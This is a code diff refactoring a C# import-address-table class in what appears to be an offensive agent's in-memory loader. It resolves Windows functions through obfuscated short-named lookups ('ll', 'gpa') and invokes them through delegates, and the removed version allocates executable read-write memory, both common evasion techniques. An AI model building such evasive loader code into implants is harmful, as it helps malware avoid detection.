@@ -1,95 +1,105 @@
-﻿#define _AMD64
-using Invoker.Dynamic;
+﻿using Invoker.Dynamic;
 using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace Agent
 {
     class IAT
     {
-        private readonly IntPtr iat_addr;
-        private int iat_pages;
-        private int iat_count;
-        private readonly Dictionary<String, IntPtr> iat_entries;
-        private delegate IntPtr VaDelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
-        private delegate bool VfDelegate(IntPtr pAddress, uint size, uint freeType);
+        private sealed class ImportEntry
+        {
+            internal IntPtr FunctionAddress;
+            internal readonly List<IntPtr> References = new List<IntPtr>();
+
+            internal ImportEntry(IntPtr functionAddress)
+            {
+                FunctionAddress = functionAddress;
+            }
+        }
+
+        private readonly Dictionary<string, ImportEntry> iat_entries = new Dictionary<string, ImportEntry>();
         private delegate IntPtr LlDelegate(string lpFileName);
         private delegate IntPtr GPADelegate(IntPtr hModule, string lpProcName);
-        private delegate void ZMDelegate(IntPtr dest, int size);
-        private delegate bool CTDelegate(IntPtr pAddress, uint size, uint freeType);
-        private bool resolved = false;
-        public IAT()
-        {
-            this.iat_pages = 2;
 
-            object[] vaParams = new object[] { IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE };
-            this.iat_addr = Generic.InvokeFunc<nint>(Resolver.GetFunc("va"), typeof(VaDelegate), ref vaParams);
-
-            //this.iat_addr = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)(this.iat_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-            this.iat_count = 0;
-            this.iat_entries = new Dictionary<string, IntPtr>();
-        }
-        public IntPtr Resolve(string dll_name, string func_name)
+        public IntPtr Resolve(string dll_name, string func_name, IntPtr reference_address)
         {
-            // do we already have it in our IAT table? It not lookup and add
-            if (!this.iat_entries.ContainsKey(dll_name + "$" + func_name))
+            string key = GetKey(dll_name, func_name);
+            if (!this.iat_entries.TryGetValue(key, out ImportEntry entry))
             {
                 object[] llParams = new object[] { dll_name };
                 IntPtr dll_handle = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("ll"), typeof(LlDelegate), ref llParams);
-                //IntPtr dll_handle = NativeDeclarations.LoadLibrary(dll_name);
-
 
                 object[] gpaParams = new object[] { dll_handle, func_name };
                 IntPtr func_ptr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gpa"), typeof(GPADelegate), ref gpaParams);
-                //IntPtr func_ptr = NativeDeclarations.GetProcAddress(dll_handle, func_name);
-                if (func_ptr == null || func_ptr.ToInt64() == 0)
+                if (func_ptr == IntPtr.Zero)
                 {
                     throw new Exception($"Unable to resolve {func_name} from {dll_name}");
                 }
-                Add(dll_name, func_name, func_ptr);
+
+                entry = new ImportEntry(func_ptr);
+                this.iat_entries.Add(key, entry);
             }
 
-            return this.iat_entries[dll_name + "$" + func_name];
-
+            return AddReference(entry, reference_address);
         }
 
-        // This can also be called directly for functions where you already know the address (e.g. helper functions)
-        public IntPtr Add(string dll_name, string func_name, IntPtr func_address)
+        public void Add(string dll_name, string func_name, IntPtr func_address)
         {
-            // check we have space in our IAT table
-            if (this.iat_count * 8 > (this.iat_pages * Environment.SystemPageSize))
+            string key = GetKey(dll_name, func_name);
+            if (this.iat_entries.TryGetValue(key, out ImportEntry existingEntry))
             {
-                throw new Exception("Run out of space for IAT entries!");
+                if (existingEntry.FunctionAddress != func_address)
+                {
+                    throw new Exception($"IAT entry {key} already exists with a different address");
+                }
+                return;
             }
 
-            Marshal.WriteInt64(this.iat_addr + (this.iat_count * 8), func_address.ToInt64());
-            this.iat_entries.Add(dll_name + "$" + func_name, this.iat_addr + (this.iat_count * 8));
-            this.iat_count++;
-            return this.iat_entries[dll_name + "$" + func_name]; 
+            this.iat_entries.Add(key, new ImportEntry(func_address));
+        }
 
+        public IntPtr AddReference(string dll_name, string func_name, IntPtr reference_address)
+        {
+            string key = GetKey(dll_name, func_name);
+            if (!this.iat_entries.TryGetValue(key, out ImportEntry entry))
+            {
+                throw new Exception($"Unable to add IAT reference for {key} as no entry exists");
+            }
+
+            return AddReference(entry, reference_address);
         }
 
         public void Update(string dll_name, string func_name, IntPtr func_address)
         {
-            if (!this.iat_entries.ContainsKey(dll_name + "$" + func_name)) throw new Exception($"Unable to update IAT entry for {dll_name + "$" + func_name} as don't have an existing entry for it");
-            // Write the new address into our IAT memory. 
-            // we don't need to update our internal iat_entries dict as that is just a mapping of name to IAT memory location.
+            string key = GetKey(dll_name, func_name);
+            if (!this.iat_entries.TryGetValue(key, out ImportEntry entry))
+            {
+                throw new Exception($"Unable to update IAT entry for {key} as no entry exists");
+            }
 
-            Marshal.WriteInt64(this.iat_entries[dll_name + "$" + func_name], func_address.ToInt64());
+            entry.FunctionAddress = func_address;
+            foreach (IntPtr reference in entry.References)
+            {
+                Marshal.WriteIntPtr(reference, func_address);
+            }
         }
 
         internal void Clear()
         {
-            // zero out memory
-            NativeDeclarations.ZeroMemory(this.iat_addr, this.iat_pages * Environment.SystemPageSize);
+            this.iat_entries.Clear();
+        }
 
-            // free it
-            object[] vfParams = new object[] { this.iat_addr, (uint)0, NativeDeclarations.MEM_RELEASE };
-            var result = Generic.InvokeFunc<bool>(Resolver.GetFunc("vf"), typeof(VfDelegate), ref vfParams);
+        private static IntPtr AddReference(ImportEntry entry, IntPtr reference_address)
+        {
+            Marshal.WriteIntPtr(reference_address, entry.FunctionAddress);
+            entry.References.Add(reference_address);
+            return reference_address;
+        }
+
+        private static string GetKey(string dll_name, string func_name)
+        {
+            return dll_name + "$" + func_name;
         }
     }
 }
